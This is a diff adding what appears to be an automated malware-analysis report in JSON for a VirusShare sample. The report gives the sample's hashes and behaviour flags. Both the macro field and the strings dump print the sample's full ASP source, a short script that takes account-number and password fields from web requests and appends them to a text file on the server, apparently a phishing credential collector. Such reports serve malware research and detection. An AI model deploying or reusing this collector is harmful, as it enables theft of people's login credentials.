@@ -1,0 +1,44 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "write": "May write to a file"
+        },
+        "macro": "<%\nnum=request(\"num\")\npass=request(\"pass\")\nset fs=server.CreateObject(\"Scripting.FileSystemObject\")\nset file=fs.OpenTextFile(server.MapPath(\"qq.txt\"),8,True)\nfile.writeline num+\"----\"+pass\nfile.close\nset file=nothing\nset fs=nothing\nresponse.write \"Send OK!\"\n%>\n\n\n\n"
+    },
+    "filename": "VirusShare_0ccff7dc71102bad04d34d9206287816",
+    "filesize": 280,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0ccff7dc71102bad04d34d9206287816",
+        "sha1": "7094d84edae26535f15ec40e64611c942c03c514",
+        "sha256": "0ac643ea12e4518994c41135273aae8aabbe18be64b55b3d23902939eaa5b0cb"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "num=request(\"num\")",
+            "pass=request(\"pass\")",
+            "set fs=server.CreateObject(\"Scripting.FileSystemObject\")",
+            "set file=fs.OpenTextFile(server.MapPath(\"qq.txt\"),8,True)",
+            "file.writeline num+\"----\"+pass",
+            "file.close",
+            "set file=nothing",
+            "set fs=nothing",
+            "response.write \"Send OK!\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.291352",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
